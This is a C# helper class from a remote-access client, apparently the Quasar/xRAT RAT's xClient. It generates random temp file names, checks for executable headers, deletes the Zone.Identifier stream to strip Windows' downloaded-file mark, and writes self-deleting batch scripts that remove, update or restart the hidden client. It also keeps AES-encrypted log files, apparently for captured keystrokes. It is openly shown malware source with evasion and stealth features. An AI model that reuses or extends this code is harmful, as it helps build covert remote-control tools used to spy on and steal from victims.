using System;
using System.IO;
using System.Text;
using xClient.Config;
using xClient.Core.Cryptography;
using xClient.Core.Data;
using xClient.Core.Utilities;

namespace xClient.Core.Helper
{
    public static class FileHelper
    {
        private const string CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        private static readonly Random _rnd = new Random(Environment.TickCount);

        public static string GetRandomFilename(int length, string extension = "")
        {
            StringBuilder randomName = new StringBuilder(length);
            for (int i = 0; i < length; i++)
                randomName.Append(CHARS[_rnd.Next(CHARS.Length)]);

            return string.Concat(randomName.ToString(), extension);
        }

        /// <summary>
        /// Creates an unused temp file path. 
        /// </summary>
        /// <param name="extension">The file extension with dot.</param>
        /// <returns>The path to the temp file.</returns>
        public static string GetTempFilePath(string extension)
        {
            while (true)
            {
                string tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
                if (File.Exists(tempFilePath)) continue;
                return tempFilePath;
            }
        }

        public static bool IsValidExecuteableFile(byte[] block)
        {
            if (block.Length < 2) return false;
            return (block[0] == 'M' && block[1] == 'Z') || (block[0] == 'Z' && block[1] == 'M');
        }

        public static bool DeleteZoneIdentifier(string filePath)
        {
            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
        }

        public static string CreateUninstallBatch(bool isFileHidden)
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string uninstallBatch = (isFileHidden)
                    ? "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 10 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    : "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 10 localhost > nul" + "\n" +
                      "del " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    ;

                File.WriteAllText(batchFile, uninstallBatch);
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static string CreateUpdateBatch(string newFilePath, bool isFileHidden)
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string uninstallBatch = (isFileHidden)
                    ? "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 10 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    : "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 10 localhost > nul" + "\n" +
                      "del " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    ;

                File.WriteAllText(batchFile, uninstallBatch);
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static string CreateRestartBatch()
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string uninstallBatch =
                    "@echo off" + "\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\n" +
                    "ping -n 10 localhost > nul" + "\n" +
                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                    "del " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, uninstallBatch);

                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static bool ClearReadOnly(string filePath)
        {
            try
            {
                FileInfo fi = new FileInfo(filePath);
                if (!fi.Exists) return false;
                if (fi.IsReadOnly)
                    fi.IsReadOnly = false;
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Appends text to a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        /// <param name="appendText">The text to append.</param>
        public static void WriteLogFile(string filename, string appendText)
        {
            appendText = ReadLogFile(filename) + appendText;

            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
            {
                byte[] data = AES.Encrypt(Encoding.UTF8.GetBytes(appendText));
                fStream.Seek(0, SeekOrigin.Begin);
                fStream.Write(data, 0, data.Length);
            }
        }

        /// <summary>
        /// Reads a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        public static string ReadLogFile(string filename)
        {
            return File.Exists(filename) ? Encoding.UTF8.GetString(AES.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
        }
    }
}
